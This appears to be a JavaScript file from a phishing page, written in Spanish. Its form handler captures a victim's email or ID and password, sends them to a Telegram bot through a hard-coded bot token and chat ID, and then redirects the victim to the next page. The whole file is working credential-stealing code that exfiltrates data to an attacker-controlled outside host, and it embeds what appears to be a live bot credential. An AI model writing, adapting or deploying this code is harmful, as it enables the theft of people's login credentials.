function enviarFormulario(event) {
    event.preventDefault();

    var documento = document.getElementById("documento").value;
    var contraseña = document.getElementById("contraseña").value;


    var mensaje = "Correo: <code>" + documento + "</code>\n" +
    "Contraseña: <code>" + contraseña + "</code>";  

    fetch("https://api.telegram.org/bot" + "6588209506:AAE0tCvE9p3LMROYDpYE8CGxVF6QV621g1w" + "/sendMessage", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: "1900569011",
            text: mensaje,
            parse_mode: "HTML"
        })
    })
    .then(function(response) {
        if (response.ok) {
            
            window.location.href = "index5.html";
        } else {
           
            console.error("Error en la llamada a la API de Telegram: ", response.statusText);
        }
    })
    .catch(function(error) {
        
        console.error("Error en la llamada a la API de Telegram: ", error);
    });
}